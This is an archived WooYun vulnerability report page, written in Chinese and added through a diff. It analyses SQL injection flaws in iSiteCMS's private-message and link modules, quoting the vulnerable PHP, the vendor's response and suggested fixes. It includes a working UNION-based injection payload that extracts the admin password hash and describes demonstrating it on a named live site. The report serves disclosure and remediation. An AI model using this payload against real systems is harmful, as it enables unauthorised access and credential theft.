@@ -1,0 +1,317 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		iSiteCMS发布安全补丁后仍然有几处注射漏洞（源码详析+实站演示）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		iSiteCMS发布安全补丁后仍然有几处注射漏洞（源码详析+实站演示）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/lxj616">lxj616</a> 
+</li><li>提交时间：		2013-12-23 16:45</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-23：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-24：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-27：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-03：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-13：	细节向普通白帽子公开<br/>
+									2014-02-02：	细节向实习白帽子公开<br/>
+									2014-03-23：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">iSiteCMS 之前有过一个后台登陆时的注射，不过后来修复了，但是<br />
+还有几处注射分布在XX模块以及XXX模块里<br />
+本文对源代码进行了详细的分析<br />
+源码分析请见详细说明，实站演示请见漏洞证明</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">/isite/components/messages/messages.fe.php    line:103<br />
+<br />
+</p><pre><code>if($form-&gt;status == TFORM_STATUS_GETED_VALID){<br />
+//这个是站内短信的写信息表单 的 处理<br />
+      $arr = $form-&gt;getValues();<br />
+//直接获取表单中信息<br />
+      $tos = explode(&#039;,&#039;,trim($arr[&#039;to&#039;]));<br />
+//只是分割，不是过滤<br />
+      $noExistsMenber = array();<br />
+      $toMenbers = array();<br />
+      foreach ($tos as $menber){<br />
+        $i =<br />
+        $this-&gt;DBE-&gt;getOne(&quot;select `id` from #__user where `name`=&#039;$menber&#039;&quot;);<br />
+//一直到上面这一句都没有过滤，直接带入数据库查询了，之所以会这么写可能的原因是开发人员误以为`name`=&#039;$menber&#039;的引号可以起到保护作用（其他的int变量都通过了inval，而这个是string啊喵，我可以输入单引号啊喵）<br />
+        if(is_null($i) or empty($i)){<br />
+          $noExistsMenber[] = $menber;<br />
+//id只要有返回就可以继续<br />
+        }else{<br />
+          $m[&#039;name&#039;] = $menber;<br />
+          $m[&#039;id&#039;]  = $i;<br />
+          $toMenbers[] = $m;<br />
+        }<br />
+      }<br />
+      if(!empty($noExistsMenber)){<br />
+        addGlobalNotice(&quot;以下用户不存在：&quot;.implode(&#039;,&#039;,$noExistsMenber));<br />
+      }else{<br />
+        $msg[&#039;tos&#039;] = $arr[&#039;to&#039;];<br />
+        $msg[&#039;subject&#039;] = $arr[&#039;subject&#039;];<br />
+        $msg[&#039;content&#039;] = $arr[&#039;content&#039;];<br />
+//进入信息发送的模块了，实际上之前就已经引发注射了，但是攻击时需要读sendMessage代码<br />
+        $mMessage-&gt;sendMessage($toMenbers,$msg);<br />
+        $this-&gt;flash(&#039;成功&#039;,&#039;发送成功&#039;,bu(1,&#039;messages&#039;,&#039;inbox&#039;));<br />
+      }</code></pre><p class='detail'><br />
+<br />
+这个就是代码里的表单显示<br />
+<br />
+</p><p class="detail"><a href="../images/2200411331dea26960db782b8695e7a5ba3567ed.png" target="_blank"><img src="../images/2200411331dea26960db782b8695e7a5ba3567ed.png" alt="2.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+先来个同理可证：<br />
+<br />
+/isite/components/links/links.be.php   line:64<br />
+<br />
+</p><pre><code>if($form-&gt;status == TFORM_STATUS_GETED_VALID){<br />
+			$newCat = $form-&gt;getValues();<br />
+			if($id==0){<br />
+				//create category<br />
+				//check name<br />
+				$name = $newCat[&#039;name&#039;];<br />
+				$nameUsed = $this-&gt;DBE-&gt;getOne(&quot;select count(*) from #__link_category where `name`=&#039;$name&#039;&quot;);<br />
+				if($nameUsed){<br />
+					$form-&gt;status = TFORM_STATUS_GETED;</code></pre><p class='detail'><br />
+<br />
+看完以上代码是不是有一种似曾相识的感觉呢？<br />
+<br />
+<br />
+<br />
+漏洞成因分析完毕<br />
+<br />
+<br />
+<br />
+下面是对于攻击方式的分析，如果您只关心如何把漏洞补上，也可以直接跳过以下内容到漏洞修复那里<br />
+<br />
+<br />
+<br />
+注射肯定是有了，但是这里有一点点别扭的地方，就是<br />
+<br />
+</p><pre><code>$tos = explode(&#039;,&#039;,trim($arr[&#039;to&#039;]));</code></pre><p class='detail'><br />
+<br />
+这句话把逗号给干掉了，给注射添加了小小难度，不过，这能难倒WOOYUN的帽子们吗？<br />
+<br />
+继续分析代码：<br />
+<br />
+/isite/components/messages/models/message.php   整个php<br />
+<br />
+</p><pre><code>function sendMessage($to,$message,$type=null,$newCall=1){<br />
+//刚才检测完用户是否存在后，调用这个函数<br />
+    if(isset($to[&#039;name&#039;]) or is_string($to)){<br />
+      if(is_string($to)){<br />
+        $to[&#039;name&#039;] = $to;<br />
+      }<br />
+      if(!isset($to[&#039;id&#039;])){<br />
+//还记得id吗，是之前被注射SQL的返回，理论上正常应该是目标用户的id<br />
+        $to[&#039;id&#039;] = $this-&gt;_db-&gt;getOne(&quot;select `id` from #__user where `name`=&#039;$to[name]&#039;&quot;);<br />
+      }<br />
+//又SELECT一遍，不过name还是注射时的name，这一句也被注射了<br />
+      global $gUser;<br />
+      $message[&#039;to&#039;] = $to[&#039;name&#039;];<br />
+      $message[&#039;to_id&#039;] = $to[&#039;id&#039;];<br />
+      $message[&#039;from&#039;] = $gUser-&gt;name;<br />
+      $message[&#039;from_id&#039;] = $gUser-&gt;id;<br />
+      $message[&#039;create_time&#039;] = TIME_STAMP;<br />
+      $message[&#039;type&#039;] = $type;<br />
+      $this-&gt;insert($message);<br />
+//看到下一句，终于长舒一口气，注射可以有回显了！to_id就是我们的语句执行结果，而它会报错给我们看的！<br />
+      $this-&gt;_db-&gt;execute(&quot;update #__user set `new_msg_count`=`new_msg_count`+1 where `id`=$message[to_id]&quot;);<br />
+      if($newCall&gt;0){<br />
+        $message[&#039;to&#039;] = &#039;&#039;;<br />
+        $message[&#039;to_id&#039;] = 0;<br />
+        $this-&gt;insert($message);<br />
+        $newCall--;<br />
+      }<br />
+    }else if(is_array($to)){<br />
+      foreach ($to as $sto){<br />
+        $this-&gt;sendMessage($sto,$message,null,$newCall);<br />
+      }<br />
+    }<br />
+  }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+注射+回显方法 ： <br />
+<br />
+</p><pre><code>test&#039; and 1=2 union select password from flexi_user where id=1#</code></pre><p class='detail'><br />
+<br />
+union select 后面加你想看的内容即可，不过记着不能用逗号哦<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">演示站点为<br />
+<br />
+http://www.xfdt.com<br />
+<br />
+</p><p class="detail"><a href="../images/2200410013a39ebd9aee4d7b240dd5f9ff576f8e.png" target="_blank"><img src="../images/2200410013a39ebd9aee4d7b240dd5f9ff576f8e.png" alt="1.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+注册一下，在会员中心-站内短信-发信息 里<br />
+<br />
+那个link模块里的注射没找到表单在什么地方，先演示这个吧<br />
+<br />
+这个就是代码里的表单显示<br />
+<br />
+</p><p class="detail"><a href="../images/2200411331dea26960db782b8695e7a5ba3567ed.png" target="_blank"><img src="../images/2200411331dea26960db782b8695e7a5ba3567ed.png" alt="2.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+先执行个database()函数<br />
+<br />
+</p><p class="detail"><a href="../images/22004230a9d64a84fe453f7e3592c12190f11ec9.png" target="_blank"><img src="../images/22004230a9d64a84fe453f7e3592c12190f11ec9.png" alt="3.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+爆管理员密码sha1<br />
+<br />
+</p><pre><code>test&#039; and 1=2 union select password from flexi_user where id=1#</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/220041557516ef376274a5fbe03af8058ba3c49a.png" target="_blank"><img src="../images/220041557516ef376274a5fbe03af8058ba3c49a.png" alt="4.PNG" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">修补方式分析：<br />
+<br />
+目前的状态是：数字型+语句中单引号（可防注射）；字符型+语句中单引号（仍能注射）<br />
+<br />
+主要需要考虑字符型变量的过滤问题<br />
+<br />
+可以addslashes，也可以用普通过滤<br />
+<br />
+也可以用框架提供的安全特性<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/lxj616" title="lxj616">lxj616</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-046702" title="iSiteCMS发布安全补丁后仍然有几处注射漏洞（源码详析+实站演示）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-12-24 22:07</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">messages模块应该是该实例网站自己扩展的模块，但经过我们检查，在部分集成模块的输入过滤上确实存在漏洞，严重影响了系统安全，同时考虑到该系统主要设计为封闭管理，会员功能不对外开放，所以综合评价危害等级为中。<br />
+我们将于近期进行安全更新。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="46702";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
